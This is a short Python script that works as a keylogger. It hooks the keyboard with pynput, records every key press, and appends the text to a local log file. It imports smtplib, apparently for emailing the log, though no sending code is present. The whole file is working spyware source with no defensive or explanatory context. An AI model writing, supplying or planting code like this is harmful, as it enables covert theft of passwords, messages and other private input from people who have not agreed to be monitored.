from pynput.keyboard import Listener
import smtplib
import time


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift':
        key = ''
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.backspace':
        key = '<backspace>'
    if key == 'Key.esc':
        key = '<esc>'
    if key == 'Key.tab':
        key = '<tab>'

    with open("log.txt", 'a') as f:
        f.write(key)


with Listener(on_press=log_keystroke) as l:
    l.join()
